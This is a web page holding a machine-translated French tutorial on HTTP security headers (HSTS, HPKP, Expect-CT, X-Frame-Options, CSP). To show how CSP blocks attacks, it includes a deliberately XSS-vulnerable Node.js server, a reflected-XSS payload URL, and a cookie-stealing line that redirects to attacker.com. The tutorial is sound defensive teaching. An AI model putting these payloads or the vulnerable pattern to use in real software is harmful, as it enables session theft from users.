<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üíÜüèø üñïüèª ü¶Ç Comment renforcer la s√©curit√© des applications Web avec des en-t√™tes HTTP üë®üèΩ‚Äç‚öïÔ∏è üò≠ üõï</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Il s'agit de la troisi√®me partie de la s√©rie sur la s√©curit√© Web: la deuxi√®me partie √©tait ¬´ S√©curit√© Web: une introduction √† HTTP ¬ª, la premi√®re ¬´ Co...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Comment renforcer la s√©curit√© des applications Web avec des en-t√™tes HTTP</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/edison/blog/434228/"><img src="https://habrastorage.org/getpro/habr/post_images/c8d/5c5/809/c8d5c5809e609fecf60c662139f248d2.jpg" alt="image"><br><br>  Il s'agit de la troisi√®me partie de la s√©rie sur la s√©curit√© Web: la deuxi√®me partie √©tait ¬´ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">S√©curit√© Web: une introduction √† HTTP</a> ¬ª, la premi√®re ¬´ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Comment les navigateurs fonctionnent - Une introduction √† la s√©curit√© des applications Web</a> ¬ª. <br><br>  Comme nous l'avons vu dans les parties pr√©c√©dentes de cette s√©rie, les serveurs peuvent envoyer des en-t√™tes HTTP pour fournir au client des m√©tadonn√©es suppl√©mentaires dans la r√©ponse, en plus d'envoyer le contenu demand√© par le client.  Les clients sont ensuite autoris√©s √† sp√©cifier comment lire, mettre en cache ou prot√©ger une ressource sp√©cifique. <br><br>  Les navigateurs ont d√©sormais impl√©ment√© une tr√®s large gamme d'en-t√™tes li√©s √† la s√©curit√© pour rendre plus difficile pour les attaquants d'exploiter les vuln√©rabilit√©s.  Dans cet article, nous allons essayer de discuter de chacun d'eux, en expliquant comment ils sont utilis√©s, quelles attaques ils emp√™chent et un petit historique pour chaque rubrique. <br><a name="habracut"></a><br><blockquote> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" title="Logiciel EDISON - d√©veloppement web"><img align="left" width="153" height="75" src="https://habrastorage.org/webt/w0/zl/to/w0zltoxvysbr0yeinstkfvw1wbg.png" alt="Logiciel EDISON - d√©veloppement web"></a> <br clear="right">  Le message a √©t√© √©crit avec le soutien d'EDISON Software, qui <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">s'efforce de faire honneur aux programmeurs russes</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partage</a> en d√©tail <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">son exp√©rience dans le d√©veloppement de produits logiciels complexes</a> . </blockquote><h3>  HTTP Strict Transport Security (HSTS) </h3><br>  Depuis la fin de 2012, il est devenu plus facile pour les supporters de HTTPS Everywhere de faire en sorte que le client utilise toujours la version s√©curis√©e du protocole HTTP gr√¢ce √† Strict Transport Security: la ligne tr√®s simple <code>Strict-Transport-Security: max-age=3600</code> indiquera au navigateur que dans l'heure qui suit (3600 secondes), il ne doit pas interagir avec l'application via des protocoles dangereux. <br><br>  Lorsqu'un utilisateur essaie d'acc√©der √† une application prot√©g√©e par HSTS via HTTP, le navigateur refuse simplement d'aller plus loin, convertissant automatiquement les URL <code>http://</code> en <code>https://</code> . <br><br>  Vous pouvez v√©rifier cela localement avec le code <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">github.com/odino/wasec/tree/master/hsts</a> .  Vous devrez suivre les instructions de README (cela inclut l'installation d'un certificat SSL approuv√© pour <code>localhost</code> sur votre ordinateur √† l'aide de l'outil <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">mkcert</a> ), puis essayez d'ouvrir <code>https://localhost:7889</code> . <br><br>  Dans cet exemple, il y a 2 serveurs: HTTPS, qui √©coute sur <code>7889</code> , et HTTP, sur le port <code>7888</code> .  Lorsque vous acc√©dez √† un serveur HTTPS, il essaiera toujours de vous rediriger vers une version HTTP qui fonctionnera car HSTS n'est pas disponible sur le serveur HTTPS.  Si vous ajoutez <code>hsts=on</code> param√®tre <code>hsts=on</code> √† votre URL, le navigateur convertit de force le lien vers la version <code>https://</code> .  √âtant donn√© que le serveur sur <code>7888</code> est uniquement accessible via le protocole http, vous <code>7888</code> par <code>7888</code> une page qui ressemble √† ceci. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/693/783/9e0/6937839e0473a7101847dfaba7a10a1d.png" alt="image"><br><br>  Vous pouvez √™tre int√©ress√© de savoir ce qui se passe lorsqu'un utilisateur visite votre site pour la premi√®re fois, car la strat√©gie HSTS n'est pas pr√©d√©finie: les attaquants peuvent potentiellement tromper l'utilisateur dans la version <code>http://</code> de votre site et y lancer une attaque, donc il y a encore place pour des probl√®mes .  Il s'agit d'un probl√®me grave car HSTS est un m√©canisme d'approbation lors de la premi√®re utilisation.  Il essaie de s'assurer qu'apr√®s avoir visit√© le site Web, le navigateur sait que HTTPS doit √™tre utilis√© dans les interactions ult√©rieures. <br><br>  Une solution de contournement pourrait √™tre en maintenant une √©norme base de donn√©es de sites Web qui prennent en charge HSTS, ce que Chrome fait via <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">hstspreload.org</a> .  Vous devez d'abord √©tablir votre politique, puis visiter le site Web et voir si elle peut √™tre ajout√©e √† la base de donn√©es.  Par exemple, nous pouvons voir que Facebook est sur la liste. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/6ce/40b/830/6ce40b8307fa218f0f6f5f8cb3ccdad9.png" alt="image"><br><br>  En soumettant votre site Web √† cette liste, vous pouvez indiquer √† l'avance aux navigateurs que votre site utilise HSTS, de sorte que m√™me la premi√®re interaction entre les clients et votre serveur se fera via un canal s√©curis√©.  Mais c'est cher, car il faut vraiment participer au HSTS.  Si, pour une raison quelconque, vous souhaitez que votre site Web soit supprim√© de la liste, ce n'est pas une t√¢che facile pour les fournisseurs de navigateurs: <br><blockquote>  Gardez √† l'esprit que l'inclusion dans la liste de pr√©chargement ne peut pas √™tre facilement annul√©e. <br><br>  Les domaines peuvent √™tre supprim√©s, mais il faut des mois pour mettre Chrome √† jour pour les utilisateurs, et nous ne pouvons pas garantir les autres navigateurs.  Ne demandez pas l'inclusion dans la liste si vous n'√™tes pas s√ªr de pouvoir prendre en charge HTTPS pour l'ensemble de votre site et de tous ses sous-domaines pendant une longue p√©riode. <br>  - Source: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">https://hstspreload.org/</a> </blockquote>  En effet, le fournisseur ne peut garantir que tous les utilisateurs utiliseront la derni√®re version de leur navigateur et que votre site sera supprim√© de la liste.  R√©fl√©chissez bien et prenez une d√©cision en fonction de votre degr√© de confiance dans HSTS et de votre capacit√© √† l'appuyer √† long terme. <br><br><h3>  √âpinglage de cl√© publique HTTP (HPKP) </h3><br>  L'√©pinglage de cl√© publique HTTP est un m√©canisme qui nous permet d'indiquer au navigateur les certificats SSL √† attendre lors de la connexion √† nos serveurs.  Cet en-t√™te utilise le m√©canisme d'approbation lors de la premi√®re utilisation, comme HSTS, et signifie qu'apr√®s la connexion du client √† notre serveur, il stockera les informations de certificat pour les interactions ult√©rieures.  Si, √† un moment donn√©, le client d√©couvre que le serveur utilise un certificat diff√©rent, il refusera poliment de se connecter, ce qui rendra tr√®s difficile la conduite d'une attaque d'homme au milieu (MITM). <br><br>  Voici √† quoi ressemble la politique HPKP: <br><br><pre> <code class="plaintext hljs">Public-Key-Pins: pin-sha256="9yw7rfw9f4hu9eho4fhh4uifh4ifhiu="; pin-sha256="cwi87y89f4fh4fihi9fhi4hvhuh3du3="; max-age=3600; includeSubDomains; report-uri="https://pkpviolations.example.org/collect"</code> </pre> <br>  L'en-t√™te annonce quels certificats le serveur utilisera (dans ce cas, deux d'entre eux) en utilisant le hachage de certificat, et inclut des informations suppl√©mentaires telles que la dur√©e de vie de cette directive ( <code>max-age = 3600</code> ) et plusieurs autres d√©tails.  Malheureusement, cela n'a aucun sens de creuser plus profond√©ment pour comprendre ce que nous pouvons faire avec la s√©curisation de la cl√© publique, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">car Chrome n'approuve pas cette fonctionnalit√©</a> - un signal que son adoption est vou√©e √† l'√©chec. <br><br>  La solution de Chrome n'est pas irrationnelle, c'est juste une cons√©quence des risques associ√©s √† la s√©curisation de la cl√© publique.  Si vous perdez votre certificat ou faites simplement une erreur pendant les tests, votre site sera inaccessible aux utilisateurs qui l'ont d√©j√† visit√© (pendant la p√©riode de validit√© de la directive <code>max-age</code> , qui est g√©n√©ralement des semaines ou des mois). <br><br>  En raison de ces cons√©quences potentiellement catastrophiques, l'adoption du HPKP √©tait extr√™mement faible et il y avait des moments <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">o√π les grands sites Web n'√©taient pas disponibles en raison d'une mauvaise configuration</a> .  Compte tenu de tout ce qui pr√©c√®de, Chrome a d√©cid√© que les utilisateurs seraient mieux sans la protection offerte par HPKP, et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">les chercheurs en s√©curit√© ne sont pas compl√®tement oppos√©s √† cette d√©cision</a> . <br><br><h3>  Expect-CT </h3><br>  Alors que HPKP d√©sapprouvait, un nouvel en-t√™te est apparu pour emp√™cher les certificats SSL frauduleux pour les clients: <code>Expect-CT</code> . <br><br>  Le but de cet en-t√™te est d'indiquer au navigateur qu'il doit effectuer des ¬´v√©rifications d'ant√©c√©dents¬ª suppl√©mentaires pour v√©rifier que le certificat est authentique: lorsque le serveur utilise l'en <code>Expect-CT</code> t√™te <code>Expect-CT</code> , il demande essentiellement au client de v√©rifier que les certificats utilis√©s se trouvent dans les journaux de certificats de transparence ouverts. (CT). <br><br>  L'initiative de transparence des certificats est le fruit des efforts de Google pour garantir: <br><blockquote>  Une plate-forme ouverte pour la surveillance et l'audit des certificats SSL en temps quasi r√©el. <br><br>  En particulier, la transparence des certificats vous permet de d√©tecter les certificats SSL √©mis par erreur par une autorit√© de certification ou obtenus par malveillance d'une autre autorit√© de certification sans faille.  Il vous permet √©galement d'identifier les autorit√©s de certification qui ont commis une fraude et d'√©mettre des certificats par malveillance. <br>  - Source: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">https://www.certificate-transparency.org/</a> </blockquote>  L'en-t√™te prend cette forme: <br><br><pre> <code class="plaintext hljs">Expect-CT: max-age=3600, enforce, report-uri="https://ct.example.com/report"</code> </pre> <br>  Dans cet exemple, le serveur demande au navigateur: <br><br><ul><li>  activer la v√©rification CT pour l'application actuelle pendant une p√©riode de 1 heure (3600 secondes) </li><li>  <code>enforce</code> appliquer cette politique et refuser l'acc√®s √† l'application en cas de violation </li><li>  envoyer un rapport √† l'URL sp√©cifi√©e en cas de violation </li></ul><br>  L'objectif de l'initiative de transparence des certificats est de d√©tecter les certificats √©mis par erreur ou malveillants (et les autorit√©s de certification frauduleuses) plus t√¥t, plus rapidement et plus pr√©cis√©ment que toute autre m√©thode utilis√©e auparavant. <br><br>  En activant l'utilisation de l'en <code>Expect-CT</code> t√™te <code>Expect-CT</code> , vous pouvez prendre cette initiative pour am√©liorer l'√©tat de s√©curit√© de votre application. <br><br><h3>  X-frame-options </h3><br>  Imaginez que vous voyez une page Web comme celle-ci <br><br><img src="https://habrastorage.org/getpro/habr/post_images/2f5/87f/f15/2f587ff15a4e613cc91e13122d49e22b.png" alt="image"><br><br>  D√®s que vous cliquez sur le lien, vous comprenez que tout l'argent de votre compte bancaire a disparu.  Qu'est-il arriv√©? <br><br>  Vous avez √©t√© victime d'une attaque par d√©tournement de clics. <br><br>  Un attaquant vous a dirig√© vers son site Web, qui affiche un lien de clic tr√®s attrayant.  Malheureusement, il a √©galement int√©gr√© la page iframe avec <code>your-bank.com/transfer?amount=-1&amp;[attacker@gmail.com]</code> , mais l'a <code>your-bank.com/transfer?amount=-1&amp;[attacker@gmail.com]</code> en d√©finissant la transparence √† 0%.  Nous pensions avoir cliqu√© sur la page d'origine, essayant de gagner un tout nouveau hamer, mais √† la place, le navigateur a fix√© un clic sur l'iframe, un clic dangereux qui a confirm√© le transfert d'argent. <br><br>  La plupart des syst√®mes bancaires exigent que vous fournissiez un NIP unique pour confirmer les transactions, mais votre banque n'a pas rattrap√© l'heure et tout votre argent a √©t√© perdu. <br><br>  L'exemple est assez extr√™me, mais il devrait vous faire comprendre quelles peuvent √™tre les cons√©quences d'une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">attaque utilisant le d√©tournement de clics</a> .  L'utilisateur a l'intention de cliquer sur un lien sp√©cifique, tandis que le navigateur provoquera un clic sur la page "invisible", qui a √©t√© int√©gr√©e comme cadre. <br><br>  J'ai inclus un exemple de cette vuln√©rabilit√© dans <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">github.com/odino/wasec/tree/master/clickjacking</a> .  Si vous ex√©cutez l'exemple et essayez de cliquer sur le lien ¬´attrayant¬ª, vous verrez que le vrai clic est intercept√© par l'iframe, ce qui le rend non transparent, de sorte qu'il est plus facile pour vous de d√©tecter le probl√®me.  Un exemple devrait √™tre disponible sur <code><a href="">http://localhost:7888</a></code> . <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e11/a28/3a9/e11a283a9d4f69c80622666fdcc647c2.png" alt="image"><br><br>  Heureusement, les navigateurs ont trouv√© une solution simple √† ce probl√®me: <code>X-Frame-Options</code> (XFO), qui vous permet de d√©cider si votre application peut √™tre incorpor√©e comme iframes sur des sites Web externes.  Popularis√© par Internet Explorer 8, XFO a √©t√© introduit pour la premi√®re fois en 2009 et est toujours pris en charge par tous les principaux navigateurs. <br><br>  Cela fonctionne comme ceci: lorsque le navigateur voit un iframe, il le charge et v√©rifie que son XFO lui permet d'√™tre inclus dans la page actuelle avant de le rendre. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/8c3/61e/04e/8c361e04e5a18bac008a106e47090dc1.png" alt="image"><br><br>  Valeurs prises en charge: <br><br><ul><li>  <code>DENY</code> : cette page Web ne peut √™tre int√©gr√©e nulle part.  Il s'agit du plus haut niveau de protection car il ne permet √† personne d'int√©grer notre contenu. </li><li>  <code>SAMEORIGIN</code> : Seules les pages du m√™me domaine que l'actuel peuvent ins√©rer cette page.  Cela signifie que <code>example.com/embedder</code> peut charger <code>example.com/embedded</code> si sa strat√©gie est d√©finie sur <code>SAMEORIGIN</code> .  Il s'agit d'une politique plus calme qui permet aux propri√©taires d'un site Web particulier d'int√©grer leurs propres pages dans leur application. </li><li>  <code>ALLOW-FROM uri</code> : pi√®ce jointe autoris√©e √† partir de l'URI sp√©cifi√©.  Nous pourrions, par exemple, autoriser un site Web externe autoris√© √† int√©grer notre contenu en utilisant <code>ALLOW-FROM https://external.com</code> .  Ceci est g√©n√©ralement utilis√© lorsque vous allez autoriser des d√©veloppeurs tiers √† int√©grer votre contenu via un iframe. </li></ul><br>  Un exemple de r√©ponse HTTP qui inclut la politique XFO la plus stricte possible est la suivante: <br><br><pre> <code class="plaintext hljs">HTTP/1.1 200 OK Content-Type: application/json X-Frame-Options: DENY ...</code> </pre> <br>  Pour montrer comment les navigateurs se comportent lorsque XFO est activ√©, nous pouvons simplement changer notre exemple d'URL en <code>http://localhost:7888 /?xfo=on</code> .  Le param√®tre <code>xfo=on</code> indique au serveur d'inclure <code>X-Frame-Options: deny</code> dans la r√©ponse, et nous pouvons voir comment le navigateur restreint l'acc√®s √† l'iframe: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ecf/751/7b7/ecf7517b7954476cacc64a7e3cb38d87.png" alt="image"><br><br>  XFO √©tait consid√©r√© comme le meilleur moyen de pr√©venir les attaques bas√©es sur les clics bas√©es sur les frames jusqu'√† ce qu'un autre titre entre en jeu apr√®s quelques ann√©es - Content Security Policy ou CSP pour faire court. <br><br><h3>  Politique de s√©curit√© du contenu (CSP) </h3><br>  L'en <code>Content-Security-Policy</code> t√™te <code>Content-Security-Policy</code> , abr√©g√© CSP, fournit des utilitaires de nouvelle g√©n√©ration pour emp√™cher une vari√©t√© d'attaques, de XSS (cross-site scripting) √† l'interception de clics (click-jacking). <br><br>  Pour comprendre comment CSP nous aide, vous devez d'abord penser √† un vecteur d'attaque.  Disons que nous venons de cr√©er notre propre moteur de recherche Google, o√π il y a un champ de saisie simple avec un bouton de soumission. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e92/afc/397/e92afc3972e0d40182d68544e8e51d5c.png" alt="image"><br><br>  Cette application web n'a rien de magique.  C'est simple <br><br><ul><li>  affiche le formulaire </li><li>  permet √† l'utilisateur de rechercher </li><li>  affiche les r√©sultats de la recherche avec le mot cl√© recherch√© par l'utilisateur </li></ul><br>  Lorsque nous effectuons une recherche simple, l'application renvoie les informations suivantes: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/5a7/977/79b/5a797779b4394913cbfef82a6e0dafe9.png" alt="image"><br><br>  Incroyable  Notre application a incroyablement compris notre recherche et a trouv√© une image similaire.  Si nous nous penchons sur le code source disponible sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">github.com/odino/wasec/tree/master/xss</a> , nous nous rendrons bient√¥t compte que l'application pr√©sente un probl√®me de s√©curit√©, car tout mot cl√© qu'un utilisateur recherche est directement imprim√© en HTML: <br><br><pre> <code class="xml hljs">var qs = require('querystring') var url = require('url') var fs = require('fs') require('http').createServer((req, res) =&gt; { let query = qs.parse(url.parse(req.url).query) let keyword = query.search || '' let results = keyword ? `You searched for "${keyword}", we found:<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://placekitten.com/200/300"</span></span></span><span class="hljs-tag"> /&gt;</span></span>` : `Try searching...` res.end(fs.readFileSync(__dirname + '/index.html').toString().replace('__KEYWORD__', keyword).replace('__RESULTS__', results)) }).listen(7888) <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Search The Web<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"search"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"__KEYWORD__"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"submit"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"results"</span></span></span><span class="hljs-tag">&gt;</span></span> __RESULTS__ <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  C'est une cons√©quence d√©sagr√©able.  Un attaquant peut cr√©er un lien sp√©cifique qui ex√©cute du JavaScript arbitraire dans le navigateur de la victime. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/3ee/628/c3a/3ee628c3af5ea6176284c5451423957c.png" alt="image"><br><br>  Si vous avez le temps et la patience d'ex√©cuter l'exemple localement, vous pouvez rapidement comprendre toute la puissance de CSP.  J'ai ajout√© un param√®tre de cha√Æne de requ√™te qui inclut CSP, afin que nous puissions essayer de passer √† une URL malveillante avec CSP activ√©: <br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">localhost</a> : 7888 /? search =% 3Cscript + type% 3D 3D% 22text% 2Fjavascript% 22% 3Ealert% 28% 27You% 20have% 20been% 20PWNED% 27% 29% 3C% 2Fscript% 3E &amp; csp = on </blockquote><img src="https://habrastorage.org/getpro/habr/post_images/903/763/6a1/9037636a1b4baa19cced586860caa993.png" alt="image"><br><br>  Comme vous le voyez dans l'exemple ci-dessus, nous avons indiqu√© au navigateur que notre strat√©gie CSP autorise uniquement les scripts inclus √† partir de la m√™me source de l'URL actuelle, que nous pouvons facilement v√©rifier en acc√©dant √† l'URL en utilisant curl et en regardant l'en-t√™te de r√©ponse: <br><br><pre> <code class="plaintext hljs">$ curl -I "http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&amp;csp=on" HTTP/1.1 200 OK X-XSS-Protection: 0 Content-Security-Policy: default-src 'self' Date: Sat, 11 Aug 2018 10:46:27 GMT Connection: keep-alive</code> </pre> <br>  √âtant donn√© que l'attaque XSS a √©t√© effectu√©e √† l'aide d'un script int√©gr√© (un script directement int√©gr√© au contenu HTML), le navigateur a poliment refus√© de l'ex√©cuter, garantissant la s√©curit√© de notre utilisateur.  Imaginez qu'au lieu d'afficher simplement une bo√Æte de dialogue d'avertissement, un attaquant configurerait une redirection vers son propre domaine via du code JavaScript, qui pourrait ressembler √† ceci: <br><br><pre> <code class="plaintext hljs">window.location = `attacker.com/${document.cookie}`</code> </pre> <br>  Ils pourraient voler tous les cookies utilisateur, qui peuvent contenir des donn√©es tr√®s confidentielles (plus √† ce sujet dans le prochain article). <br><br>  √Ä pr√©sent, il devrait √™tre clair comment CSP nous aide √† pr√©venir un certain nombre d'attaques sur les applications Web.  Vous d√©finissez une politique, et le navigateur s'y conformera strictement, refusant d'ex√©cuter des ressources qui violeront la politique. <br><br>  Une option int√©ressante pour CSP est le mode de rapport uniquement.  Au lieu d'utiliser l'en <code>Content-Security-Policy</code> t√™te <code>Content-Security-Policy</code> , vous pouvez d'abord v√©rifier l'effet du CSP sur votre site en disant au navigateur de simplement signaler les erreurs sans bloquer l'ex√©cution du script, etc. Utilisation de l'en <code>Content-Security-Policy-Report-Only</code> t√™te <code>Content-Security-Policy-Report-Only</code> . <br><br>  Les rapports vous permettront de comprendre quels changements critiques peuvent √™tre caus√©s par la strat√©gie CSP que vous souhaitez d√©ployer et de les corriger en cons√©quence.  Nous pouvons m√™me fournir l'URL du rapport et le navigateur nous enverra le rapport.  Voici un exemple complet de strat√©gie de rapport uniquement: <br><br><pre> <code class="plaintext hljs">Content-Security-Policy: default-src 'self'; report-uri http://cspviolations.example.com/collector</code> </pre> <br>  Les strat√©gies CSP elles-m√™mes peuvent √™tre un peu compliqu√©es, par exemple dans l'exemple suivant: <br><br><pre> <code class="plaintext hljs">Content-Security-Policy: default-src 'self'; script-src scripts.example.com; img-src *; media-src medias.example.com medias.legacy.example.com</code> </pre> <br>  Cette politique d√©finit les r√®gles suivantes: <br><br><ul><li>  les scripts ex√©cutables (par exemple JavaScript) ne peuvent √™tre t√©l√©charg√©s <code>scripts.example.com</code> partir de <code>scripts.example.com</code> </li><li>  Les images peuvent √™tre t√©l√©charg√©es √† partir de n'importe quelle source ( <code>img-src: *</code> ) </li><li>  le contenu vid√©o ou audio peut √™tre t√©l√©charg√© √† partir de deux sources: <code>medias.example.com</code> et <code>medias.legacy.example.com</code> </li></ul><br>  Comme vous pouvez le voir, il peut y avoir de nombreux politiciens, et si nous voulons offrir une protection maximale √† nos utilisateurs, cela peut √™tre un processus assez fastidieux.  Cependant, la r√©daction d'une politique CSP compl√®te est une √©tape importante vers l'ajout d'une couche de s√©curit√© suppl√©mentaire √† nos applications Web. <br><br>  Pour plus d'informations sur CSP, je recommanderais <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a> . <br><br><h3>  Protection X-XSS </h3><br>  Bien que remplac√© par CSP, l'en <code>X-XSS-Protection</code> t√™te <code>X-XSS-Protection</code> fournit le m√™me type de protection.  Cet en-t√™te est utilis√© pour att√©nuer les attaques XSS dans les anciens navigateurs qui ne prennent pas totalement en charge CSP.  Cet en-t√™te n'est pas pris en charge par Firefox. <br><br>  Sa syntaxe est tr√®s similaire √† ce que nous venons de voir: <br><br><pre> <code class="plaintext hljs">X-XSS-Protection: 1; 